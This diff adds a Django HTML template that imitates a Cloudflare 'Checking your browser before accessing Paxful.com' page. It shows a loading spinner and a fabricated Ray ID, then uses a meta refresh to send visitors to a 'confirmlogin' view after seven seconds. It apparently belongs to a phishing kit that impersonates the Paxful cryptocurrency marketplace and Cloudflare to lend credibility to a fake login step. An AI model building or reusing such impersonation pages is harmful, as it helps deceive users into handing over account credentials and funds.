@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width= device-width, initial-scale=1.0">
+        <meta http-equiv= "refresh" content="7;url={% url 'confirmlogin' %}">
+        <link rel="stylesheet" href="{%static 'style.css'%}">
+        <link
+        rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic"/>
+        <link rel="stylesheet" href="style2.css">
+    </head>
+    <body>
+        
+        <div class="redirect">
+            <div class="loader"></div>
+        <div id="redirect-block">
+            <h2 id="browser-check">Checking your browser<br class="brk"> before accessing<br class="brk"> Paxful.com</h2>
+            <p id="check-p">This process is automatic. Your<br class="brk"> browser will redirect to your requested<br class="brk"> content shortly.</p>
+            <p id="check-p2">Please allow up to 5 seconds ...</p>
+
+            <p id="check-p3">DDoS proteced by<a id="cloud-f" href="">Cloudflare</a></p>
+            <p id="ray-id">Ray ID: <span id="ray">5f45dd1578334b28ccy</span></p>
+        </div>
+        <div>
+    </body>
+</html>
